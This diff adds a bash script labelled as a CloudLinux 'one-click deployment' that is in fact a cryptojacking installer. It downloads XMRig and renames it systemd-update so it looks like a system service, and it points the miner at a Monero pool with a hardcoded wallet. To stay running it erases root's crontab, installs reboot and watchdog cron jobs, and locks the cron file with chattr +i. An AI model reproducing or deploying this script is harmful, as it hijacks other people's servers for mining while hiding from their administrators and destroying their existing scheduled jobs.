@@ -1,0 +1,138 @@
+#!/bin/bash
+echo "=========================================================="
+echo " ONE-CLICK DEPLOYMENT - CLOUDLINUX 6 LIGHT MODE OPTIMIZED"
+echo "=========================================================="
+
+WALLET="4AJfLf4QvpNjGCSjuqRK3RAJYP2x6JsBV8vqBcNzqgZZcLUQiExCwV1Wp7Jnf5N3koKy6PZ931Yu4SKtX3bqy21A8f7s4oT"
+POOL_DOMAIN="pool.supportxmr.com:443"
+
+INSTALL_DIR="/opt/engine_sys_update"
+GLOBAL_BIN="/usr/bin/systemd-update"
+GLOBAL_CONFIG="/etc/sys-update.conf"
+LOG="/tmp/sys-update.log"
+WATCHDOG_PATH="/usr/local/bin/miner_watchdog.sh"
+CRON_FILE="/var/spool/cron/root"
+
+# ==========================================================
+# [1] AGGRESSIVE PROCESS CLEANUP & RESET INSTANCES
+# ==========================================================
+echo "[1] Menghentikan total seluruh instansi lama..."
+pkill -f "systemd-update" 2>/dev/null
+pkill -f "xmrig" 2>/dev/null
+killall systemd-update xmrig 2>/dev/null
+sleep 2
+
+# Buka proteksi file sistem dan bersihkan berkas lama
+chattr -i "$GLOBAL_BIN" "$CRON_FILE" 2>/dev/null
+rm -f "$GLOBAL_BIN" "$LOG" "$GLOBAL_CONFIG" "$INSTALL_DIR/systemd-update-core" 2>/dev/null
+mkdir -p "$INSTALL_DIR"
+
+# ==========================================================
+# [2] APPLY COMPATIBLE BINARY FOR KERNEL 2.6 (CENTOS 6)
+# ==========================================================
+echo "[2] Memperbarui struktur fisik biner kamuflase..."
+cd "$INSTALL_DIR" 2>/dev/null
+
+if [ ! -f "systemd-update-core" ]; then
+    echo "Mengunduh biner rilis kompatibilitas glibc lama..."
+    cd /tmp
+    wget -q --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-noble-x64.tar.gz -O /tmp/xmrig.tar.gz
+    tar -xf xmrig.tar.gz
+    cp /tmp/xmrig-6.26.0/xmrig "$INSTALL_DIR/systemd-update-core" 2>/dev/null
+    rm -rf /tmp/xmrig*
+    cd "$INSTALL_DIR"
+fi
+chmod +x systemd-update-core
+
+# ==========================================================
+# [3] SUNTIK KONFIGURASI 
+# ==========================================================
+echo "[3] Menyuntikkan berkas konfigurasi hemat memori ke $GLOBAL_CONFIG..."
+cat << JSON_EOF > "$GLOBAL_CONFIG"
+{
+    "autosave": false,
+    "donate-level": 1,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": true,
+        "priority": 5,
+        "memory-pool": true,
+        "yield": false,
+        "asm": "auto",
+        "argon2-impl": "auto",
+        "profiles": {
+            "rx": [0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30]
+        }
+    },
+    "pools": [
+        {
+            "algo": "rx/0",
+            "url": "$POOL_DOMAIN",
+            "user": "$WALLET",
+            "pass": "x",
+            "rig-id": "ubuntu_bersih",
+            "keepalive": true,
+            "tls": true
+        }
+    ],
+    "randomx": {
+        "init": -1,
+        "mode": "fast",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache": "shared"
+    }
+}
+JSON_EOF
+
+# ==========================================================
+# [4] RE-WRITE WRAPPER USING BASH EXEC EXECUTION MASK
+# ==========================================================
+echo "[4] Membakar script jembatan pembungkus nama murni..."
+cat << 'WRAPPER_EOF' > "$GLOBAL_BIN"
+#!/bin/bash
+GLOBAL_CONFIG="/etc/sys-update.conf"
+if [ "$1" == "--cpanel" ] || [ -z "$1" ]; then
+    bash -c "exec -a systemd-update /opt/engine_sys_update/systemd-update-core --config=$GLOBAL_CONFIG --cpanel"
+else
+    bash -c "exec -a systemd-update /opt/engine_sys_update/systemd-update-core $@"
+fi
+WRAPPER_EOF
+chmod +x "$GLOBAL_BIN"
+
+# ==========================================================
+# [5] UPDATE WATCHDOG PROTECTION WITH NEW PARAMS
+# ==========================================================
+echo "[5] Menyinkronkan ulang sistem pengawasan Watchdog..."
+rm -f "$WATCHDOG_PATH" 2>/dev/null
+cat << 'WATCHDOG_EOF' > "$WATCHDOG_PATH"
+#!/bin/bash
+if pgrep -f "systemd-update --cpanel" > /dev/null; then
+    exit 0
+fi
+cd /opt/engine_sys_update
+nohup stdbuf -oL /usr/bin/systemd-update --cpanel >/tmp/sys-update.log 2>&1 &
+WATCHDOG_EOF
+chmod +x "$WATCHDOG_PATH"
+
+crontab -r 2>/dev/null
+cat << CRON_EOF > "$CRON_FILE"
+@reboot sleep 15 && nohup stdbuf -oL /usr/bin/systemd-update --cpanel >/tmp/sys-update.log 2>&1 &
+*/5 * * * * $WATCHDOG_PATH >/dev/null 2>&1
+CRON_EOF
+chmod 600 "$CRON_FILE"
+chattr +i "$CRON_FILE" 2>/dev/null
+
+# ==========================================================
+# [6] LAUNCH MASKING ENGINE
+# ==========================================================
+echo "[6] Melepas hantaman siluman murni systemd-update via SSL..."
+nohup stdbuf -oL /usr/bin/systemd-update --cpanel 2>&1 | tee $LOG &
+sleep 5
+
+echo "=========================================================="
+echo "    KONFIGURASI SELESAI - STATUS PROSES AKTIF:"
+echo "=========================================================="
+ps aux | grep systemd-update | grep -v grep
